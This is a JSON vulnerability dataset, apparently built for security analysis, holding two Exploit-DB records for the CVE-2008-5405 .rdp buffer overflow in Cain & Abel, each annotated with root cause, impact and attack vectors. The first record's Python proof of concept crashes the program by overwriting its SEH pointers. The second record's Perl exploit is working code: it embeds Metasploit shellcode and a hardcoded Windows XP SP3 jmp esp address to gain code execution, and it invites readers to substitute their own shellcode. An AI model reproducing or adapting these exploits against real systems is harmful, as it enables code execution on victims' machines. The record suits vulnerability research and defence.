```
[
  {
    "Original_Content": "Cain & Abel 4.9.23 - '.rdp' Buffer Overflow (PoC)\n\n#### EDB-ID:\n\n###### 7297\n\n#### CVE:\n\n###### [2008-5405](https://nvd.nist.gov/vuln/detail/CVE-2008-5405)\n\n---\n\n**EDB Verified:**\n\n#### Author:\n\n###### [Encrypt3d.M!nd](/?author=2087)\n\n#### Type:\n\n###### [dos](/?type=dos)\n\n---\n\n#### Platform:\n\n###### [Windows](/?platform=windows)\n\n#### Date:\n\n###### 2008-11-30\n\n---\n\n**Vulnerable App:**\n\n```\n# exploit.py\n##########################################################\n# Cain & Abel v4.9.23 (rdp file) Buffer Overflow PoC\n# (other versions may also affected)\n# By:Encrypt3d.M!nd\n#    encrypt3d.blogspot.com\n#\n# Greetz:-=Mizo=-,L!0N,El Mariachi,MiNi SpIder\n##########################################################\n#\n# Description:\n# When Using Remote Desktop Password Decoder in Cain and\n# Importing \".rdp\" file contains long Chars(ex:8250 chars)\n# The Program Will crash.And The Following Happen:\n#\n# EAX:41414141  ECX:7C832648  EDX:41414142  EBX:00000000\n# ESP:0012BCD4  EBP:0012BCD4  ESI:001F07A8  EDI:00000001\n# EIP:7E43C201 USER32.7E43C201\n#\n# Access violation When Reading [41414141]\n#\n# And Also The Pointer to next SEH record and SE Handler\n# Will gonna BE Over-wrote\n#\n# This Poc Will Gonna Overwrite the Pointer to next SEH\n# With\"42424242\" and The SE Handler with\"43434343\"\n#\n##########################################################\nchars = \"A\"*8194\nptns = \"B\"*4\nshan = \"C\"*4\nchars2 = \"A\"*200\n\nexp=open('cain.rdp','w')\nexp.write(chars+ptns+shan+chars2)\nexp.close()\n\n# milw0rm.com [2008-11-30]\n\n```",
    "Root_cause": "A buffer overflow vulnerability exists when Cain & Abel imports a specially crafted .rdp file with an excessive number of characters.",
    "Weaknesses": [
      "Buffer Overflow"
    ],
    "Impact": "The program will crash due to an access violation when reading from an overwritten address. The pointer to the next SEH record and the SE handler will also be overwritten.",
    "Attack_vectors": "Importing a malicious \".rdp\" file containing a large number of characters.",
    "Required_attacker_capabilities": "The attacker needs to create a malicious .rdp file and import it into Cain & Abel using the Remote Desktop Password Decoder."
  },
  {
    "Original_Content": "Cain & Abel 4.9.24 - '.rdp' Local Stack Overflow\n\n#### EDB-ID:\n\n###### 7309\n\n#### CVE:\n\n###### [2008-5405](https://nvd.nist.gov/vuln/detail/CVE-2008-5405)\n\n---\n\n**EDB Verified:**\n\n#### Author:\n\n###### [SkD](/?author=1426)\n\n#### Type:\n\n###### [local](/?type=local)\n\n---\n\n#### Platform:\n\n###### [Windows](/?platform=windows)\n\n#### Date:\n\n###### 2008-11-30\n\n---\n\n**Vulnerable App:**\n\n```\n#!/usr/bin/perl\n#\n# Cain & Abel <= v4.9.24 .RDP Stack Overflow Exploit\n# Exploit by SkD (skdrat@hotmail.com)\n# -----------------------------------------------\n#\n# Nothing much to say about this one. This works on\n# an updated Windows XP SP3. On Vista this exploit is way easier\n# the more challenging one was on XP, and here it is.\n# Enjoy :). Also remember if you want to put your own shellcode\n# there are a few character restrictions and using Alpha2 or\n# Alpha Numerical won't work at all.\n# To open the .RDP file in Cain & Abel, click the\n# \"Remote Password Decoder Dialog\" icon.\n# Credits to Encrypt3d.M!nd.\n# {Author has no responsibility over the damage you do with this!}\n\nuse strict; use warnings;\n\n# win32_exec -  EXITFUNC=seh CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com\nmy $shellcode =\n\"\\x29\\xc9\\x83\\xe9\\xdd\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x19\".\n\"\\xc5\\xd8\\x59\\x83\\xeb\\xfc\\xe2\\xf4\\xe5\\x2d\\x9c\\x59\\x19\\xc5\\x53\\x1c\".\n\"\\x25\\x4e\\xa4\\x5c\\x61\\xc4\\x37\\xd2\\x56\\xdd\\x53\\x06\\x39\\xc4\\x33\\x10\".\n\"\\x92\\xf1\\x53\\x58\\xf7\\xf4\\x18\\xc0\\xb5\\x41\\x18\\x2d\\x1e\\x04\\x12\\x54\".\n\"\\x18\\x07\\x33\\xad\\x22\\x91\\xfc\\x5d\\x6c\\x20\\x53\\x06\\x3d\\xc4\\x33\\x3f\".\n\"\\x92\\xc9\\x93\\xd2\\x46\\xd9\\xd9\\xb2\\x92\\xd9\\x53\\x58\\xf2\\x4c\\x84\\x7d\".\n\"\\x1d\\x06\\xe9\\x99\\x7d\\x4e\\x98\\x69\\x9c\\x05\\xa0\\x55\\x92\\x85\\xd4\\xd2\".\n\"\\x69\\xd9\\x75\\xd2\\x71\\xcd\\x33\\x50\\x92\\x45\\x68\\x59\\x19\\xc5\\x53\\x31\".\n\"\\x25\\x9a\\xe9\\xaf\\x79\\x93\\x51\\xa1\\x9a\\x05\\xa3\\x09\\x71\\x35\\x52\\x5d\".\n\"\\x46\\xad\\x40\\xa7\\x93\\xcb\\x8f\\xa6\\xfe\\xa6\\xb9\\x35\\x7a\\xeb\\xbd\\x21\".\n\"\\x7c\\xc5\\xd8\\x59\";\nmy $addr = \"\\xb5\\xb5\\xfd\\x7f\";\nmy $overflow = \"\\x41\" x 8206 ;\nmy $overflow2 = \"\\x41\" x 255 ;\nmy $eip = \"\\xd7\\x30\\x9d\\x7c\"; #   FOR WINDOWS XP SP3:  0x7c9d30d7       jmp esp (shell32.dll)\n\nopen(my $rdp, \"> s.rdp\");\nprint $rdp $overflow.$eip.$addr.$overflow2.$shellcode;\nclose($rdp);\n\n# milw0rm.com [2008-11-30]\n\n```",
    "Root_cause": "A stack buffer overflow vulnerability occurs in Cain & Abel when processing a malformed .rdp file with an excessive number of characters.",
    "Weaknesses": [
      "Stack Buffer Overflow"
    ],
    "Impact": "Arbitrary code execution. The exploit overwrites the return address on the stack with an address pointing to a JMP ESP instruction, which allows control flow to be redirected to attacker-controlled shellcode also located on the stack. The provided exploit aims to execute calc.exe as a proof of concept.",
    "Attack_vectors": "Importing a specially crafted .rdp file containing malicious code.",
    "Required_attacker_capabilities": "The attacker needs to create a malicious .rdp file and import it into Cain & Abel using the Remote Password Decoder. The attacker also needs the ability to execute code on the victim's machine."
  }
]
```